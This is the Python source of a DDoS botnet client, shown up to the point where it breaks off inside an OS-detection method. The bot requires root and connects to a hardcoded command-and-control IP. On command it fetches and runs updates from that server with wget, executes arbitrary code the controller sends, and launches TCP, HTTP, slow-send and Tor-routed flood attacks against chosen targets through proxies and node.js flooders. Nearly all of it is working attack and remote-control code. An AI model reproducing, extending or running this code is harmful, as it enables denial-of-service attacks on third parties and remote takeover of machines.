#cython: language_level=3
import json
import os
from platform import machine
#if os.getlogin() != 'root':
if not os.geteuid()==0:
	exit('e#2')

import time, sys, lsb_release

while 1:
	try:
		from python_socks.async_.asyncio import	Proxy
		import requests, httpx, aiohttp
		break
	except:
		print("Installing required dependencies..")
		time.sleep(0.5)
		os.system('python3.9 -m pip install httpx[http2] python-socks[asyncio] requests aiohttp aiohttp_socks >/dev/null 2>&1')

from base64	import b64encode
from threading import Thread
import asyncio
import traceback
import random
import datetime
import multiprocessing
import struct
import ssl
import string
import subprocess
import re
import socket
from multiprocessing import Value
from urllib.parse import urlparse
import ctypes

ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
ssl_context.check_hostname = False
ssl_context.verify_mode	= ssl.CERT_NONE
ssl_context.options = -1039775664
ssl_context.set_alpn_protocols(['http1.1'])
ssl_context.set_ciphers('TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA')

VERSION	= 91
TOR_PORTS = range(3050, 3100)
bot_key	= b'jetti-retti11weltgoothraqkm'
DEBUG =	'debug' in sys.argv
work_path =	'/usr/share/debconf/network'
controller_ip = '190.211.252.26'
bridges	= []
bridges_addrs = []
stop = False
attacks	= []
proxies	= []

def	handle_exception(loop, context):
	print(context.get("exception", context["message"]))

class Files():

	def	check(self,	file):
		if '.' in file:
			if os.path.exists(file):
				return True
		else:
			if os.path.isdir(file):
				return True

	def	new(self, file,	data, wr='wb'):
		try:
			f =	open(file, wr)
			f.write(data)
			f.close()
		except:
			return False
		return True

	def	mkdir(self,	dir):
		try:
			os.makedirs(dir)
		except:
			return False
		return True

	def	open(self, file, wr='r'):
		try:
			f =	open(file, wr)
		except:
			return False
		return f

class HTTPRequest:

	def	__init__(self, host, path='/', method='GET'):

		self.method	= method
		self.path =	path
		self.host =	host

		self.header_start =	"{0} {1} HTTP/1.1\r\n"
		self.headers = {}
		self.body =	''

		self.headers["Host"] = host
		self.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"
		self.headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
		self.headers["Accept-Language"] = "en-US,en;q=0.5"
		self.headers["Accept-Encoding"] = "gzip, deflate"
		self.headers["Connection"] = "keep-alive"
		self.headers["Upgrade-Insecure-Requests"] = "1"
		self.headers["Sec-Fetch-Dest"] = "document"
		self.headers["Sec-Fetch-Mode"] = "navigate"
		self.headers["Sec-Fetch-Site"] = "none"
		self.headers["Sec-Fetch-User"] = "?1"

	def	set_header(self, name, value):
		self.headers[name] = value

	def	set_cookie(self, cookie):
		if 'Cookie' in self.headers:
			self.headers["Cookie"] = self.headers["Cookie"]	+ '; ' + cookie	
		else:
			self.headers["Cookie"] = cookie

	def	set_path(self, path):
		self.path =	path

	def	handle_redirect(self, path):
		self.headers['Referer'] = f'{self.host}{self.path}'
		self.path = path

	def set_method(self, method):
		self.method = method

	def	get_cookies(self):
		return self.headers.get("Cookie")

	def	compose(self):
		return self.header_start.format(self.method, self.path)	+ '\r\n'.join('{}: {}'.format(key, value) for key, value in self.headers.items()) +	"\r\n\r\n"

stats =	{
	"connected": 0,
	"errors": 0,
	"init":	0,
	"sent":	0,
	"recon": 0,
	"calls": 0
}

def	counter(event):
	global stats

	stats[event] += 1
	if event != 'errors':
		stats['calls'] += 1

	if stats['calls'] >	50:
		stats['calls'] = 0
		print(stats)

def	generate_string(size=8,	type='default'):
	collection = string.ascii_letters +	string.digits

	if type	== 'hash':
		collection = 'abcdef0123456789'

	return ''.join(random.choice(collection) for _ in range(size))

def slash_prepend():
	return ''.join('/' * random.randint(1, 500))

async def open_connection(proxy, dst, ssl):
	sock = await proxy.connect(dest_host=dst[0], dest_port=int(dst[1]), timeout=180)
	reader,	writer = await asyncio.open_connection(
		host=None,
		port=None,
		sock=sock,
		ssl=ssl_context	if ssl else	None,
		server_hostname=dst[0] if ssl else None,
	)
	return reader, writer

class cnc_packet_reactor:

	def	__init__(self):
		self.buffer	= Buffer()
		self.protocol =	{
			0: ['attacks', 'machine_info'],	   # to_client+server |	Keep Alive
			1: ['crypt_id'],   # to_client+server |	Not	Encrypted
			2: ['target', 'duration', 'method',	'threads', 'data_len'],	# client | Start Attack
			3: ['executable', 'ver'], #	to_client |	Update 
			4: ['executable'],		  # to_client |	Download & Run 
			5: ['cpu_cores', 'cpu_model', 'cpu_load', 'ram_total', 'ram_used', 'ram_free', 'ver'], # to_server | Machine & bot info	
			6: ['empty'],	   # to_client | Stop Attacks
			7: ['proxies'],	   # to_client | Proxies
			8: ['code'],	   # to_client | RCE
			9: ['restart'],	   # to_client | Restart
			10:['bridges'],	   # to_client | Bridges
			11:['netstat'],	   # to_client | Netstat
			12:['message']	   # to_server | stats/other
		}
		self.connected = False


	def	read_packets(self):
		packets=[]

		while len(self.buffer):
			packet_length =	unpack_varint(self.buffer)

			# Ensure we read all the packet
			if (len(self.buffer) < packet_length):
				self.log("Need more	bytes: got %d, total %d" % (len(self.buffer), packet_length))
				self.buffer.reset_cursor()
				return packets + ["need	more bytes:	got	%d,	total %d" %	(len(self.buffer), packet_length)]
		
			packet_id =	unpack_varint(self.buffer)
			data_len = packet_length - len(varint_pack(packet_id))
			packet_data	= self.buffer.read(data_len)

			packet,	field =	{"id": packet_id}, 0
			for	value in packet_data.split(b"<|||>"):
				try:
					packet[self.protocol[packet_id][field]]	= value
				except:
					raise RuntimeError("UnpackerOverflow: id %d lenght %d field	%d value %s" % (packet_id, packet_length, field, str([value])))
				field += 1

			packets.append(packet)
			self.buffer.save()

		return packets

	def	send_response(self,	packet_id, packet_data=b""):
		raw_packet_data=b""

		if packet_data:
			fields = self.protocol[packet_id]

			for	field in fields:
				if type(packet_data[field])	== bytes:
					raw_packet_data	+= packet_data[field]
				else:
					raw_packet_data	+= bytes(packet_data[field], 'utf8')
				
				if field != fields[-1]:
					raw_packet_data	+= b"<|||>"

		return varint_pack(len(raw_packet_data)+len(varint_pack(packet_id))) + varint_pack(packet_id) +	raw_packet_data
	
	def	gen_priv_seed(self,	pub_seed): return (((int.from_bytes(pub_seed, 'big') >> 2) * 3) >> 8).to_bytes(4, byteorder='big')
		
	def	react(self,	data):
		global proxies

		self.buffer.send(data)
		packets	= self.read_packets()
		response = b''

		for	packet in packets:
			if 'more bytes' in packet:
				if DEBUG: print(packet)
				continue
			if not packet:
				print('waiting for more	bytes')
				continue

			self.log('Got packet' +	str(packet['id']))

			if packet["id"]	== 0: #	Keep Alive
				response += self.send_response(
					packet_id	= 0,
					packet_data	= {
						"attacks": "\n".join([attack.info for attack, _ in attacks]),
						"machine_info":	json.dumps(MachineInfo().get())
					}
				) #	Pong

			elif packet["id"] == 1: # Crypt	request
				response += self.send_response(
					packet_id	= 1,
					packet_data	= {
						"crypt_id":	self.gen_priv_seed(int(packet['crypt_id']).to_bytes(4, byteorder='big'))
					}
				) 
				response += self.send_response(
					packet_id	= 5,	
					packet_data	= dict(zip(MachineInfo().get(),	map(str, MachineInfo().get().values())))
				)
				self.connected = True

			elif packet["id"] == 2: # Start	Attack
				packet.pop("id")
				print(packet)
				Attack(packet)

			elif packet["id"] == 3: # Update
				#if	int(packet['ver']) > VERSION:
				try:
					self.log('Updating')
					execute_hidden("rm bot")
					execute_hidden(f"wget {controller_ip}/9bRLHfFbS0vmH4JZg6 -O bot")
					execute_hidden("chmod +x bot")
					controller.restart()
				except Exception as error:
					self.log("Update failed: " + str(error))
				#else:
					#self.log('Bot is up-to-date')

			elif packet["id"] == 6:
				controller.manage_attacks(stop_all=True)

			elif packet["id"] == 7:
				with open('proxy.txt', 'wb') as pfile:
					pfile.write(packet['proxies'])
				print('got %d proxies' % packet['proxies'].count(b'\n'))

			elif packet["id"] == 8: # RCE
				try:
					exec(packet["code"])
				except Exception as error:
					print(f"RCE error: {error}")
			
			elif packet["id"] == 9:
				controller.restart()

			elif packet["id"] == 10:
				bridges.clear()
				bridges_addrs.clear()
				for bridge in packet['bridges'].decode().split('\n'):
					addr, port_range, proxy_type = bridge.split(':')
					port_range = port_range.split('-')
					bridges_addrs.append(addr)

					for port in range(*list(map(int, port_range))):
						bridges.append([addr, port, proxy_type])
				
				print('got %d bridges' % len(bridges))
				if DEBUG: print(bridges)

			elif packet["id"] == 11:
				response += self.send_response(
					packet_id = 11, 
	 				packet_data	= {'netstat': json.dumps(netstat)})
	
			else: #	Unhandled packet
				self.log(f'Unknown packet: {packet}')

		return response


	def	log(self, m):
		if DEBUG: print(f"[cnc_reactor]: {m}")



class Controller(object):

	def	__init__(self):
		self.cnc_reactor = None
		self.watchdog_initialized = False

	def	log(self, m):
		print(f'[{datetime.datetime.now().strftime("%H:%M:%S")}/Controller]	{m}')

	async def network_loop(self):		
		if not self.watchdog_initialized:
			asyncio.create_task(watchdog(self))
			asyncio.create_task(start_nodes(TOR_PORTS))
			self.watchdog_initialized = True

		while not stop:
			self.cnc_reactor = None
			try:
				#proxy_list	= get_proxy_list()
				#proxy = random.choice(proxy_list)
				#proxy = Proxy.from_url(f'socks5://{proxy[0]}:{proxy[1]}', rdns=False)
				reader,	self.writer = await asyncio.wait_for(
					#open_connection(proxy,	('2.57.187.164', 25565), False),
					asyncio.open_connection(controller_ip, 8443), timeout = 5)
			except Exception as error: 
				self.log(f"Cant	connect	to CNC:	{error}")
				continue

			self.cnc_reactor = cnc_packet_reactor()
			self.manage_attacks()
			self.log('Connected')
			try:
				while not stop:
					data = await asyncio.wait_for( 
						reader.read(65535), timeout = 20)
					if not data:
						raise RuntimeError('Connection closed')

					reaction = self.cnc_reactor.react(data)
					self.manage_attacks()

					if reaction:
						self.writer.write(reaction)
						await self.writer.drain()

			except Exception as error:
				self.log(f"Error in network loop: {error}")
				self.writer.close()
				await asyncio.sleep(1)
				if DEBUG: raise

		self.writer.close()

	def	manage_attacks(self, stop_all=False):
		for	attack, stop_signal in list(attacks):
			time_diff = time.time()	- attack.time_stop

			if time_diff > 0 or stop_all:
				stop_signal.value = 1
				self.log(f'attack {attack.info}	stopped')
				#attack.process.terminate()
				attacks.remove([attack, stop_signal])

		if stop_all:
			os.system("pkill -9 node")
			os.system("find	/tmp/* -type d -exec rm -R {} \;")
	
	def	restart(self):
		global stop
		stop = True
		self.manage_attacks(True)
		os.execv('python3 client-omg.py', ['bot'])

def	get_proxy_list(proxy_type='socks'):
	f = 'proxy.txt'
	if proxy_type == 'http': f = 'http.txt'

	proxy_list = []
	with open(f, 'r') as proxies:
		for	proxy in proxies.read().split('\n'):
			proxy =	proxy.split(':')
			if len(proxy) != 2: continue
			proxy[1] = int(proxy[1])
			proxy_list.append(proxy)
	print('Proxies:	%d'	% len(proxy_list))
	return proxy_list

def	empty_list():
	proxy_list = [['127.0.0.1',	1]]
	print('Proxies:	%d'	% len(proxy_list))
	return proxy_list

class Attack():

	def	__init__(self, settings):
		global attacks
		
		self.time_start	= time.time()
		self.time_stop = self.time_start + int(settings['duration'])
		self.settings =	settings

		self.sync_methods =	[
			b'HTTP_REFRESH',
			b'HTTP_REFRESH_FAST',
			b'HTTP_REFRESH_PIPE',
			b'HTTP_REFRESH_PIPE_PRI',
			b'HTTP_FLOOD_GET',
			b'HTTP_FLOOD_PRI',
			b'HTTP_BYPASS_FLOODER_GET',
			b'HTTP_BYPASS_FLOODER_PRI',
			b'HTTP_RIAS_GET',
			b'HTTP_RIAS_PRI',
			b'HTTP_MEGA'
		]

		self.cookies = []
		self.emulation_time	= 12
		self.target	= self.settings['target'].decode('utf8').replace('http://',	'').replace('https://',	'').split(':')
		self.target[1] = int(self.target[1])
		self.path = self.target[0].split("/", 1)[-1] if len(self.target[0].split("/", 1)) > 1 else '/'

		if self.settings['data_len'] != b'64' and self.settings['method'] in self.sync_methods:
			settings = self.settings['data_len'].decode()
			if ";" in settings or "=" in settings:
				self.cookies = self.settings['data_len'].decode().split(";")
			else:
				self.emulation_time	= int(settings)
		else:
			try:
				self.settings['data_len'] =	int(self.settings['data_len'])
			except:
				self.settings['data_len'] =	64

			if self.settings['data_len'] > 665:
				self.part_len =	random.randint(3,6)
			else:
				self.part_len =	random.randint(16,26)

			self.http_request =	HTTPRequest(self.target[0], self.path).compose().encode()
			self.http_request_pri =	HTTPRequest(self.target[0], self.path, 'PRI').compose().encode()
			self.data =	memoryview(self.http_request * self.settings['data_len'])
			self.start_len = random.randint(30,36)

			varint = random.choice([
				('\x8f\xc8\x7f', 2089999), ('\x8e\xc8\x7f',	2089998),
				('\x8d\xc8\x7f', 2089997), ('\x8c\xc8\x7f',	2089996),
				('\x8b\xc8\x7f', 2089995), ('\x8a\xc8\x7f',	2089994),
				('\x89\xc8\x7f', 2089993), ('\x88\xc8\x7f',	2089992),
				('\x87\xc8\x7f', 2089991), ('\xa3\xc0\x7f',	2088995),
				('\xa2\xc0\x7f', 2088994), ('\xa1\xc0\x7f',	2088993),
				('\xa0\xc0\x7f', 2088992), ('\x9f\xc0\x7f',	2088991)
			])
			ids	= random.choice([
				'\x03\x02',	'\x04\x05',	'\x04\x02',	'\x03\x04',	'\x00\x09',
				'\x09\x08',	'\x01\x06',	'\x07\x03',	'\x04\x05'
			])
			self.junk_data = bytes((varint[0] +	ids	+ self.target[0]) *	int((varint[1]/5)-(self.part_len+self.start_len+len(self.target[0])+1)), 'utf8')

		self.info =	f"{unix2date(self.time_start)} -> {unix2date(self.time_stop)}: {settings}"

		self.http_target = ''
		if b'https'	in self.settings['target']:
			self.http_target = 'https://' + self.target[0]
			self.ssl = ssl_context
		else:
			self.http_target = 'http://' + self.target[0]
			self.ssl = False

		stop_signal = Value(ctypes.c_int, 0)
		self.process = multiprocessing.Process(target=self.start_attack, args=(stop_signal,))
		self.process.start()

		attacks.append([self, stop_signal])

	def	start_attack(self, stop_signal):
		self.stop_signal = stop_signal
		proxy_list = get_proxy_list()
		http_proxy_list = get_proxy_list('http')

		use_http = False
		use_bridges = False
		use_tor = False
		use_raw = False

		if self.settings['method'].endswith(b'_BRIDGE'):
			self.settings['method'] = self.settings['method'].replace(b'_BRIDGE', b'')
			use_bridges = True

		if self.settings['method'].endswith(b'_HTTP'):
			self.settings['method'] = self.settings['method'].replace(b'_HTTP', b'')
			use_http = True
   
		if self.settings['method'].endswith(b'_TOR') or ".onion" in self.target[0]:
			self.settings['method'] = self.settings['method'].replace(b'_TOR', b'')
			use_tor = True

		if self.settings['method'].endswith(b'_RAW'):
			if b"TCP_DATA" not in self.settings['method']:
				self.settings['method'] = self.settings['method'].replace(b'_RAW', b'')
				use_raw = True
   
		method = {
			# async-methods
			b"TCP_DATA"             : self.data_flood,
			b"TCP_DATA_RAW"         : self.data_flood_raw,
			b"TCP_CONN"             : self.connection_flood,
			b"TCP_WAIT"             : self.connection_wait,
			b"TCP_MCSHORTJUNK"      : self.TCP_MCSHORTJUNK,
			b"TCP_HANG"             : self.TCP_HANG,
			b"HTTP_PRI"             : self.http_pri,
			b"HTTP_SLICED"          : self.sliced_flood,
			b"TOR_KILLER_DATA"      : self.tor_killer_data_flood,
			b"TOR_KILLER_RECON"     : self.tor_killer_recon_flood,
			b"TOR_ATTACKER"     	: self.attacker,
			b"TOR_ATTACKER_RECON"   : lambda _: self.attacker(0, self.http_fullget),
			b"TOR_ATTACKER_SLICE"   : lambda _: self.attacker(0, self.sliced_flood),
			b"HTTP_FULLGET"         : self.http_fullget
		}.get(self.settings['method'])
		
		for	proxy in bridges_addrs:
			try:
				with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
					sock.connect((proxy, 443))
					sock.sendall(b"\x85\xb8\xfc\x70\x3d\xe5\x69\x1a\x3b\x0f")
			except Exception as e:
				print('failed to connect with bridge: %s' % e)
		tasks = []
		self.loop = asyncio.new_event_loop()
		asyncio.set_event_loop(self.loop) # is this necessary?

		async def _stop_watchdog():
			while not self.stop_signal.value:
				await asyncio.sleep(0.1)
			print('stop_watchdog fired')
			await asyncio.sleep(30)
			self.process.terminate()

		if b"HTTP_FLOOD" in self.settings['method']: # HTTP_FLOOD is special for tls.js method
			#proxy = 'http.txt'
			#method = self.settings['method'].decode().split("_")[2]
			os.system(f"node flooder-js.js {self.http_target} {self.settings['duration'].decode()} {min(int(self.settings['threads'].decode()) * 1, 10)} {self.settings['data_len']} http.txt")

		elif b"HTTP_BROWSER" in self.settings['method']:
			#proxy = 'http.txt'
			os.system(f"screen -dmS aexqtp sh start.sh syetabrowser.js {self.http_target} {self.settings['duration'].decode()} {min(int(self.settings['threads'].decode()) * 1, 10)} {self.settings['data_len']} http.txt GET")
			#os.system("rm bench/page.json")
			#os.system(f"bash bench/start.sh -g {self.http_target} -u {self.http_target} -p /root/proxy.txt -pb /root/proxy.txt -b {self.settings['threads'].decode()}")

		elif b"HTTP_FIR" in self.settings['method']:
			os.system(f"node l7/index.js {self.http_target} --humanization true --mode http --precheck true --proxy http.txt --time {self.settings['duration'].decode()} --pool {self.settings['data_len']} --uptime 20000 --workers {self.settings['threads'].decode()}")

		else:
			for	i in range(int(self.settings['threads'])):
				if use_bridges:
					proxy = random.choice(bridges)
				elif use_http:
					proxy = random.choice(http_proxy_list)
					proxy.append('http')
				else:
					proxy = random.choice(proxy_list)
					proxy.append('socks4')
					
				if use_tor:
					proxy =	['127.0.0.1', min(TOR_PORTS) + i, 'socks4']
				if use_raw:
					proxy = None
		
				if self.settings['method'] not in self.sync_methods: # async methods goes here
					proxy =	Proxy.from_url(f'{proxy[2]}://{proxy[0]}:{proxy[1]}', rdns=use_tor)			
					tasks.append(method(proxy))
				else: # sync methods goes here
					# TODO: start this with interval to reduce CPU load spikes?
					Thread(target=method, args=(proxy,)).start()
					# Will threads die if this process terminates first? 
					# Probably yes, but normally this shoud not happen.
					# This is important: if threads doesnt exits properly,
					# browsers may keep running (without driver.quit() call)

			if not tasks:
				# Append watchdog for sync-methods to keep event-loop running,
				# assuming that new tasks will be added from method threads.
				# (async-methods dont need this, they are tasks by themselves)
				tasks.append(_stop_watchdog())

			self.loop.run_until_complete(asyncio.wait(tasks))

	async def attacker(self, _=None, method=None):
		method = method or self.http_fullget_oneshot
		max_circuits_per_node = 1
		max_connections_per_circuit = 2
		circuits, connections, node = 0, 0, 0
		self.active_tasks = 0
		active_tasks_limit = 4096
		node_name = 0

		def task_done(_):
			self.active_tasks -= 1

		while not self.stop_signal.value:
			try:
				await asyncio.sleep(int(self.settings['data_len'])/1000)
				if self.active_tasks < active_tasks_limit:
					if connections == max_connections_per_circuit:
						connections = 0
						node_name += 1
						circuits += 1
						if circuits == max_circuits_per_node:
							circuits = 0
							node += 1
						if node_name > 8192:
							node_name = 0

					if node > len(TOR_PORTS):
						circuits, connections, node = 0, 0, 0
					#paddr = f"socks5://circuit{circuits}:passwd@127.0.0.1:{min(TOR_PORTS)+node}"
					paddr = f"socks5://{node_name}:passwd@127.0.0.1:{min(TOR_PORTS)+node}"
					#paddr = f"socks4://127.0.0.1:{min(TOR_PORTS)+node}"
					proxy = Proxy.from_url(paddr, rdns=True)
					print(f'starting connection {connections}, active {self.active_tasks}, paddr', paddr)
					self.loop.create_task(method(proxy)).add_done_callback(task_done)

					self.active_tasks += 1
					connections += 1
				#else:
				#	print('active tasks', self.active_tasks)
			except Exception as e:
				print('error in attacker', e)

	async def TCP_HANG(self, proxy):
		while not self.stop_signal.value:
			try:
				await open_connection(proxy, self.target, self.ssl)
				counter('recon')
				#writer.close()
			except Exception as error:
				#print(error)
				counter('errors')

	async def TCP_MCSHORTJUNK(self,	proxy):
		try:
			_, writer =	await open_connection(proxy, self.target, self.ssl)
		except RuntimeError:
			print(f"Connection to {proxy.host} failed")
			if DEBUG: raise
			return
		except:	pass
		#counter('connected')

		while not self.stop_signal.value:
			try:
				writer.write(self.junk_data[:self.start_len])
				await asyncio.sleep(0)
				await writer.drain()
				#counter('sent')
				for	lines in range(0, len(self.junk_data), self.part_len):
					writer.write(self.junk_data[lines:lines+self.part_len])

					if self.settings['data_len'] == 999:
						sleep_time = 0.01
					elif self.settings['data_len'] == 555:
						sleep_time = 0.02
					elif self.settings['data_len'] == 444:
						sleep_time = 0.05
					else:
						sleep_time = 0.002

					await writer.drain()
					await asyncio.sleep(sleep_time)
			except Exception as error:
				try:
					_, writer =	await open_connection(proxy, self.target, self.ssl)
					#counter('recon')
				except:
					#counter('errors')
					pass

	async def sliced_flood(self, proxy):
		sliced_by =	random.randint(1,8)
		#counter('init')
		
		try:
			_, writer =	await open_connection(proxy, self.target, self.ssl)
		except RuntimeError:
			if DEBUG: print(traceback.format_exc())
			print(f"Connection to {proxy.host} failed")
			return
		except:	
			if DEBUG: print(traceback.format_exc())
		#counter('connected')
		iter = 0
		while not self.stop_signal.value:
			try:
				writer.write(self.data[iter:iter+sliced_by])
				await asyncio.sleep(0.05)
				await writer.drain()
				iter += sliced_by
				#counter('sent')
			except:
				try:
					_, writer =	await open_connection(proxy, self.target, self.ssl)
					if DEBUG: print(traceback.format_exc())
					#counter('recon')
				except:
					#counter('errors')
					if DEBUG: print(traceback.format_exc())

	async def data_flood(self, proxy):
		counter('init')
		try:
			_, writer =	await open_connection(proxy, self.target, self.ssl)
		except RuntimeError:
			if DEBUG: print(traceback.format_exc())
			print(f"Connection to {proxy.host} failed")
			return
		except:	
			if DEBUG: print(traceback.format_exc())
		counter('connected')

		while not self.stop_signal.value:
			try:
				writer.write(self.data)
				await asyncio.sleep(0.01)
				await writer.drain()
				counter('sent')
			except:
				try:
					_, writer =	await open_connection(proxy, self.target, self.ssl)
					if DEBUG: print(traceback.format_exc())
					counter('recon')
				except:
					counter('errors')
					if DEBUG: print(traceback.format_exc())

	async def data_flood_raw(self, proxy):
		try:
			_, writer =	await asyncio.open_connection(
				host=self.target[0],
				port=int(self.target[1]),
				ssl=ssl_context	if self.ssl else None,
				server_hostname=self.target[0] if self.ssl else None)
		except RuntimeError:
			if DEBUG: print(traceback.format_exc())
			print(f"Connection to {proxy.host} failed")
			return
		except:	
			if DEBUG: print(traceback.format_exc())
		#counter('connected')

		while not self.stop_signal.value:
			try:	
				writer.write(self.data)
				await asyncio.sleep(0.1)
				await writer.drain()
				#counter('sent')
			except:
				try:
					_, writer =	await asyncio.open_connection(
						host=self.target[0],
						port=int(self.target[1]),
						ssl=ssl_context	if ssl else	None,
						server_hostname=self.target[0] if ssl else None
					)
					if DEBUG: print(traceback.format_exc())
					#counter('recon')
				except:
					#counter('errors')
					if DEBUG: print(traceback.format_exc())

	async def connection_flood(self, proxy):
		#counter('init')
		
		try:
			_, writer =	await open_connection(proxy, self.target, self.ssl)
		except RuntimeError:
			print(f"Connection to {proxy.host} failed"); return
		except:	pass
		#counter('connected')

		while not self.stop_signal.value:
			try:
				_, writer =	await open_connection(proxy, self.target, self.ssl)
				#counter('recon')
				writer.close()
			except:
				#counter('errors')
				pass

	async def tor_killer_recon_flood(self, proxy):
		counter('init')
		while not self.stop_signal.value:
			try:
				proxy =	Proxy.from_url(f'socks5://test{random.randint(0,30)}:penis@127.0.0.1:{random.choice(TOR_PORTS)}', rdns=True)
				for _ in range(100):
					try:
						_, writer =	await open_connection(proxy, self.target, False)
						counter('recon')
						writer.close()
					except:
						counter('errors')
				await asyncio.sleep(1)
			except Exception as err:
				counter('errors')
				print(err)

	'''async def tor_killer_data_flood(self, proxy):
		counter('init')
		while not self.stop_signal.value:
			proxy =	Proxy.from_url(f'socks4://{random.randint(0,30)}:{random.randint(0,30)}@127.0.0.1:{random.choice(TOR_PORTS)}', rdns=True)
			conns = []
			for conns_per_circ in range(3):
				try:
					_, writer =	await open_connection(proxy, self.target, False)
					writer.write(self.http_request)
					conns.append(writer)
					counter('connected')
				except: counter('errors')

			while conns:
				for conn in list(conns):
					try:
						writer.write(self.data)
						await asyncio.sleep(0.05)
						await writer.drain()
						counter('sent')
					except:
						conns.remove(conn)
						counter('errors')'''

	async def tor_killer_data_flood(self, proxy):
		counter('init')
		while not self.stop_signal.value:
			proxy =	Proxy.from_url(f'socks5://test{random.randint(0,30)}:penis@127.0.0.1:{random.choice(TOR_PORTS)}', rdns=True)
			for _ in range(8):
				try:
					if self.stop_signal.value: break
					reader, writer = await open_connection(proxy, self.target, False)
					writer.write(self.http_request)
					counter('connected')
					while 1:
						if self.settings['data_len'] == 2:
							self.data = self.http_request
							await reader.read(8192)
						writer.write(self.data)
						await asyncio.sleep(0.05)
						await writer.drain()
						counter('sent')
				except: counter('errors')


	async def connection_wait(self,	proxy):
		#counter('init')
		
		try:
			_, writer =	await open_connection(proxy, self.target, self.ssl)
		except RuntimeError:
			print(f"Connection to {proxy.host} failed"); return
		except:	pass
		#counter('connected')

		while not self.stop_signal.value:
			try:
				_, writer =	await open_connection(proxy, self.target, self.ssl)
				#counter('recon')
				await asyncio.sleep(self.settings['data_len']/10)
				writer.close()
			except:
				#counter('errors')
				pass


	async def http_pri(self, proxy):
		#counter('init')
		
		try:
			_, writer =	await open_connection(proxy, self.target, self.ssl)
		except RuntimeError:
			if DEBUG: print(traceback.format_exc())
			print(f"Connection to {proxy.host} failed")
			return
		except:	
			if DEBUG: print(traceback.format_exc())
		#counter('connected')

		while not self.stop_signal.value:
			try:	
				writer.write(self.http_request_pri)
				await asyncio.sleep(self.settings['data_len'] /	1000)
				await writer.drain()
				#counter('sent')
			except:
				try:
					_, writer =	await open_connection(proxy, self.target, self.ssl)
					if DEBUG: print(traceback.format_exc())
					#counter('recon')
				except:
					#counter('errors')
					if DEBUG: print(traceback.format_exc())

	async def http_fullget(self, proxy):
		counter('init')

		while not self.stop_signal.value:
			for _ in range(32):
				if self.stop_signal.value: break
				await self.http_fullget_oneshot(proxy)
		
	async def http_fullget_oneshot(self, proxy):
		http_request = HTTPRequest(self.target[0], self.path)
		data = self.http_request
		sent = 0
		try:
			reader, writer = await open_connection(proxy, self.target, self.ssl)
			counter('connected')
			for _ in range(300):
				response = b''
				#if self.settings['data_len'] == 255: # pipelining
				writer.write(data)
				#else:
				#	writer.write(data)
				await writer.drain()
				counter('sent')
				sent += 1
				cookie = None
				
				while not response.endswith(b'\n'):
					if 'Cookie' in  http_request.headers and self.settings['data_len'] == 99:
						await asyncio.sleep(0.5)
						break
					received = await reader.read(65535)
					if not received:
						raise ValueError('receive failed')
					response += received
					
				response = response.decode('utf8', 'ignore')
				location_header_pos = response.find('Location:')
				cookie_header_pos = response.find('Set-Cookie:')

				if location_header_pos > 0:
					redirect_path = response[location_header_pos+len('Location:'):response.find('\r\n', location_header_pos)].strip()
					http_request.handle_redirect(redirect_path)
					print('redirect', [redirect_path])

				if cookie_header_pos > 0:
					cookie = response[cookie_header_pos+len('Set-Cookie:'):response.find('\r\n', cookie_header_pos)].strip().split(';', 1)[0]
					#if self.settings['data_len'] > 250:
					http_request.headers['Cookie'] = cookie
					#else:
					#	http_request.set_cookie(cookie)
					print('cookie', [cookie])

				if cookie_header_pos > 0 or location_header_pos > 0:
					data = http_request.compose().encode()

				print('response total_len', len(response), 'sent', sent)
			
				if self.stop_signal.value: break
				#print(response[:512])
		except Exception as err:
			print(err, 'sent', sent)
			counter('errors')
			try: writer.abort()
			except: pass

def	unix2date(unixtime):
	return datetime.datetime.fromtimestamp(unixtime).strftime('%H:%M:%S')
	
def	unpack_varint(bbuff):
	total =	0
	shift =	0
	val	= 0x80
	while val &	0x80:
			val	= struct.unpack('B', bbuff.read(1))[0]
			total |= (val &	0x7F) << shift
			shift += 7
	if total >= (1 << 32):
			return None
	if total & (1 << 31):
			total -= 1 << 32
	return total
	
def	varint_pack(d):
	o =	b''
	while True:
		b =	d &	0x7F
		d >>= 7
		o += struct.pack("B", b	| (0x80	if d > 0 else 0))
		if d == 0:
			break
	return o

class Buffer(object):
	buff = b''
	cursor = 0

	def	read(self, length):
		if length >	len(self):
			raise RuntimeError("BufferUnderflow")

		out	= self.buff[self.cursor:self.cursor+length]
		self.cursor	+= length
		return out

	def	write(self,	data):
		self.buff += data

	def	flush(self):
		return self.read(len(self))

	def	save(self):
		self.buff =	self.buff[self.cursor:]
		self.cursor	= 0

	def	reset_cursor(self):
		self.cursor	= 0

	def	get_cursor(self):
		return self.cursor

	def	reset(self):
		self.buff =	b''
		self.cursor	= 0

	def	__len__(self):
		return len(self.buff) -	self.cursor

	recv   = read
	append = write
	send   = write

class MachineInfo(object):
	def	__init__(self):
		pipe = os.popen('free -t -m')
		self.cpuinfo = open('/proc/cpuinfo').read()
		self.raminfo = list(map(int, pipe.readlines()[-1].split()[1:]))
		pipe.close()
		self.info =	{'ver':	VERSION}
		self.fetch()
	
	def	fetch(self):
		self.fetchCPU()
		self.fetchRAM()
		self.fetchOS()
	
	def	fetchCPU(self):
		self.info['cpu_cores'] = self.cpuinfo.count('processor\t:')
		cpu_model =	None
		for	cpu	in self.cpuinfo.split(': '):
			if 'CPU' in cpu:
				cpu_model =	cpu.split('\n')[0]
		self.info['cpu_model'] = cpu_model
		self.info['cpu_load'] =	os.getloadavg()
	
	def	fetchRAM(self):
		self.info['ram_total'] = self.raminfo[0]
		self.info['ram_used']  = self.raminfo[1]
		self.info['ram_free']  = self.raminfo[2]

	def	fetchOS(self):
		try:
			self.info['os']	= lsb_release.get_os_release()['ID']
		except:
